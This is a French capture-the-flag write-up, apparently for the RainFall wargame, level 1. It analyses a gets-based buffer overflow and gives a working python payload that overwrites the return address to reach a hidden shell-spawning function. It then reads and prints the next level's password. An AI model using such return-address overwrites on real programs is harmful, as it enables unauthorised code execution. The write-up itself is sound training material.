### Level 1

En ouvrant le binaire level1 dans cutter on que le main contiens un buffer de 0x50 -> 80 qui est charger de recevoir le résultat du get qui lit l'entré standard après l'execution du programme. On remarque que si on dépasse ce buffer le programme segfault.

```
level1@RainFall:~$ ./level1
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
Segmentation fault (core dumped)
level1@RainFall:~$ 
```
En regradant on remarque egalement qu'il y a une fonction non-appeler qui execute un sh a l'adresse *0x08048444*. Il faut donc faire en sorte de depasser le buffer pour ecraser l'EIP et la remplacer par notre fonction. Pour ce fair on cree un payload qui affiche 76 caractere (80 - 4 pour laddresse mémoire de la fonction) et d'y ajouter l'adresse de la fonction en "little-endian" ce qui donne : "\x44\x84\x04\x08". ensuite il suffit de le passer a notre programme.

```
level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/payload
evel1@RainFall:~$ cat /tmp/payload - | ./level1 
Good... Wait what?

whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```